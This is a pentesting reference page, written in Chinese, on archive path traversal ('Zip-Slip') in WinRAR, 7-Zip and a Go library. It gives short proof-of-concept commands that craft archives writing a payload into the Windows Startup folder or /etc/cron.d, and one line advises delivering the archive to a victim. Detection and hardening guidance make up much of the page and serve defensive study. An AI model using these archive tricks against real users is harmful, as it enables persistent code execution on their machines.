# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概述

许多归档格式（ZIP、RAR、TAR、7-ZIP 等）允许每个条目携带其自己的 **内部路径**。当解压工具盲目信任该路径时，包含 `..` 的恶意文件名或一个 **绝对路径**（例如 `C:\Windows\System32\`）会被写入到用户选择目录之外。  
此类漏洞通常称为 *Zip-Slip* 或 **archive extraction path traversal**。

后果从覆盖任意文件到通过将有效载荷放入诸如 Windows *Startup* 文件夹之类的 **auto-run** 位置直接实现 **remote code execution (RCE)** 不等。

## 根本原因

1. 攻击者构造一个归档，其中一个或多个文件头包含：
   * 相对遍历序列（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
   * 绝对路径（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
   * 或精心构造的 **symlinks**，解析后位于目标目录之外（在 ZIP/TAR 的 *nix* 上常见）。
2. 受害者使用一个易受攻击的工具解压该归档，该工具信任嵌入的路径（或跟随 symlinks），而不是对其进行清理或强制在所选目录下解压。
3. 文件被写入攻击者控制的位置，并在系统或用户下次触发该路径时被执行/加载。

## 真实案例 – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows（包括 `rar` / `unrar` CLI、DLL 和可移植源码）在解压过程中未能验证文件名。  
一个恶意 RAR 归档包含如下条目：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
会最终位于所选输出目录的**外部**，并位于用户的*Startup*文件夹中。登录后 Windows 会自动执行该处的所有内容，从而提供*持久* RCE。

### 制作 PoC 存档 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – 按原样存储文件路径（不要裁剪前导的 `./`）。

将 `evil.rar` 交付给受害者，并指示他们使用有漏洞的 WinRAR 版本进行解压。

### 在野外观察到的利用

ESET 报告称 RomCom (Storm-0978/UNC2596) 的鱼叉式钓鱼活动中附带了滥用 CVE-2025-8088 的 RAR 压缩包，用于部署定制后门并协助勒索软件操作。

## 更新的案例（2024–2025）

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **漏洞**：ZIP 条目为 **symbolic links** 在解压时被取消引用，允许攻击者逃出目标目录并覆盖任意路径。用户只需 *打开/解压* 压缩包即可触发。
* **受影响**：7-Zip 21.02–24.09（Windows & Linux 构建）。在 **25.00**（2025 年 7 月）及更高版本修复。
* **影响路径**：覆盖 `Start Menu/Programs/Startup` 或服务运行位置 → 代码将在下次登录或服务重启时运行。
* **快速 PoC (Linux)**：
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
在已修补的版本中 `/etc/cron.d` 不会被修改；symlink 会被作为链接提取到 /tmp/target 内。

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **漏洞**：`archiver.Unarchive()` 会跟随 `../` 和 symlinked ZIP 条目，写入 `outputDir` 之外。
* **受影响**：`github.com/mholt/archiver` ≤ 3.5.1（项目现已弃用）。
* **修复**：切换到 `mholt/archives` ≥ 0.1.0 或在写入前实现规范路径检查。
* **最小复现**：
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## 检测建议

* **静态检测** – 列出压缩包条目并标记任何名称包含 `../`, `..\\`, *绝对路径* (`/`, `C:`) 或类型为 *symlink* 且目标位于提取目录之外的条目。
* **规范化** – 确保 `realpath(join(dest, name))` 仍以 `dest` 开头。否则拒绝。
* **沙箱解压** – 将压缩包解压到一次性目录，使用 *safe* 的解压器（例如 `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00），并验证结果路径保留在该目录内。
* **端点监控** – 在 WinRAR/7-Zip 等打开压缩包后不久，对写入 `Startup`/`Run`/`cron` 位置的新可执行文件发出告警。

## 缓解与加固

1. **更新解压工具** – WinRAR 7.13+ 和 7-Zip 25.00+ 实现了路径/符号链接清理。两者仍然缺乏自动更新功能。
2. 尽可能使用 “**Do not extract paths**” / “**Ignore paths**” 选项提取压缩包。
3. 在 Unix 上，解压前降低权限并挂载 **chroot/namespace**；在 Windows 上，使用 **AppContainer** 或沙箱。
4. 如果编写自定义代码，请在创建/写入之前使用 `realpath()`/`PathCanonicalize()` 进行规范化，并拒绝任何逃出目标目录的条目。

## 其他受影响/历史案例

* 2018 – Snyk 发布的大量 *Zip-Slip* 通告，影响许多 Java/Go/JS 库。
* 2023 – 7-Zip CVE-2023-4011 在 `-ao` 合并期间发生的类似遍历。
* 2025 – HashiCorp 的 `go-slug` (CVE-2025-0377) 在 slugs 中的 TAR 解压路径遍历（v1.2 已修补）。
* 任何在写入之前未调用 `PathCanonicalize` / `realpath` 的自定义解压逻辑。

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
